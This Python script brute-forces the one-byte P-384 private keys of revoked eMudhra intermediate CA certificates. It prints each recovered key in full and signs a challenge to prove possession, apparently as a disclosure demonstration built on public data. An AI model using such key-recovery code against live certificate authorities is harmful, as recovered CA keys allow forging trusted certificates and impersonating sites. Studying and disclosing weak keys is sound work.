#!/usr/bin/env python3
"""Recover the private keys of the (revoked) eMudhra intermediate CAs.

Reads PEM certificates, and for each P-384 public key tries d = 1..255
(the keys have a single non-zero byte). Public data only; nothing is
contacted. Usage: .venv/bin/python crack_real.py [--steps] certs/*.pem
"""
import argparse
import time
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec

CURVE = ec.SECP384R1()


def short(n):
    h = f"{n:096x}"
    return f"{h[:12]}...{h[-6:]}"


def crack(pub, limit=255, steps=False):
    t = pub.public_numbers()
    if steps:
        print(f"  step 2: d is one byte, so only {limit} candidates (1..{limit}), not 2^384")
        print(f"  step 3: compute d*G for each d and\n  step 4: compare with Q.x = {short(t.x)}")
    for d in range(1, limit + 1):
        p = ec.derive_private_key(d, CURVE).public_key().public_numbers()
        hit = (p.x, p.y) == (t.x, t.y)
        if steps and (d <= 3 or hit):
            print(f"    d = {d:3} -> d*G.x = {short(p.x)}  {'MATCH' if hit else 'no match'}")
        elif steps and d == 4:
            print("    ...")
        if hit:
            return d
    return None


def prove(cert, d):
    """Sign a challenge with the recovered key; verify with the cert's public key."""
    key = ec.derive_private_key(d, CURVE)
    msg = b"I hold the private key of " + cert.subject.rfc4514_string().encode()
    sig = key.sign(msg, ec.ECDSA(hashes.SHA384()))
    cert.public_key().verify(sig, msg, ec.ECDSA(hashes.SHA384()))  # raises if bad
    return sig


def main(paths, steps=False):
    found = {}
    t0 = time.perf_counter()
    for path in map(Path, paths):
        cert = x509.load_pem_x509_certificate(path.read_bytes())
        cn = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        if steps:
            print(f"\n=== {path.name} ===")
            q = cert.public_key().public_numbers()
            print(f"  step 1: read public key Q from the certificate ({cn})")
            print(f"    Q.x = {short(q.x)}")
        d = crack(cert.public_key(), steps=steps)
        if steps and d:
            print(f"  step 5: sign a challenge with d={d}, verify with Q from the certificate")
        status = f"d = {d} (0x{d:02x})" if d else "not in 1..255"
        print(f"{cn:22} issued by {issuer:32} -> {status}")
        if d:
            found.setdefault(d, []).append(cn)
            sig = prove(cert, d)
            raw = d.to_bytes(48, "big").hex()
            print(f"    private key d = {raw[:-2]}\033[1m{raw[-2:]}\033[0m")
            print(f"    signed a challenge, verified against the certificate: "
                  f"OK (sig {sig.hex()[:24]}...)")
    dt = time.perf_counter() - t0
    print(f"\n{len(paths)} certs, {len(found)} distinct weak keys {sorted(found)} "
          f"recovered in {dt:.2f}s")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--steps", action="store_true", help="narrate each step of the attack")
    ap.add_argument("certs", nargs="+")
    a = ap.parse_args()
    main(a.certs, a.steps)
